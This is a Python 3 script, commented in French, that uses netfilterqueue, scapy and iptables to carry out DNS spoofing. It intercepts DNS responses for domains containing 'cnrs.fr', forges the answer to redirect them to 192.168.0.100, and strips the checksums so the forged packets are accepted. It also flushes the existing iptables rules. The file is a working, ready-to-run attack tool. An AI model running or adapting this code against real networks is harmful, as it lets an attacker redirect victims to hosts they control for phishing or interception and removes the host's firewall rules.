#!usr/bin/python3

import netfilterqueue #permet de faire un nombre de queue depuis IP tables pour forward the packets and change the packets while the user is sending them
import scapy.all as scapy
import os

def del_fields(scapy_packet): #supprimer les champs len et chksum qui, s'ils ne matchent pas, mettent le packet a la poubelle, ainsi en les supprimant tout ira bien
	del scapy_packet[scapy.IP].len
	del scapy_packet[scapy.IP].chksum
	del scapy_packet[scapy.UDP].len
	del scapy_packet[scapy.UDP].chksum
	return scapy_packet


def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload()) #,IP header ; on veut avoir le payload du paquet qui contient la requete/reponse DNS
	if scapy_packet.haslayer(scapy.DNSRR): #si c'est une reponse DNS ; sinon DNSQR pour request
		print("layer DNSRR")
		qname = scapy_packet[scapy.DNSQR].qname #si on recoit une reponse DNS, le query name (la recherche dans la barre) sera le qname du paquet demande (DNSRQ)
		print("qname : " + str(qname))
		if "cnrs.fr" in str(qname): #si le site est dans le qname
			print("trouve")
			answer = scapy.DNSRR(rrname=qname, rdata="192.168.0.100") #reponse ; rrname = qname, rdata = l'ip vers laquelle on veut rediriger
			scapy_packet[scapy.DNS].an = answer #an est la partie answer du paquet
			scapy_packet[scapy.DNS].ancount = 1 #une seule reponse, on peut en mettre plusieurs

			scapy_packet = del_fields(scapy_packet)

			packet.set_payload(bytes(scapy_packet)) #dans python3, set_payload contient des bytes, dans python2, c'est un str()
	packet.accept() #va envoyer le paquet modifie

os.system("sudo iptables --flush")
os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0")
os.system(f"iptables -A FORWARD -o wlan0 -j ACCEPT")
os.system(f"iptables -A FORWARD -m state --state ESTABLISHED,RELATED -i wlan0 -j ACCEPT")
os.system('sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 0')
os.system("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0") #celui la et celui d'en dessous juste sur la machine locale
os.system("sudo iptables -I INPUT -j NFQUEUE --queue-num 0")

queue = netfilterqueue.NetfilterQueue() #objet queue
try:
	queue.bind(0, process_packet) #, 0=Q number ; process_packet est la fonction qui modifier nos paquets et rediriger les users
	print("queue.run")
	queue.run()
except:
	os.system("iptables --flush")
	print("IPtables flushed")
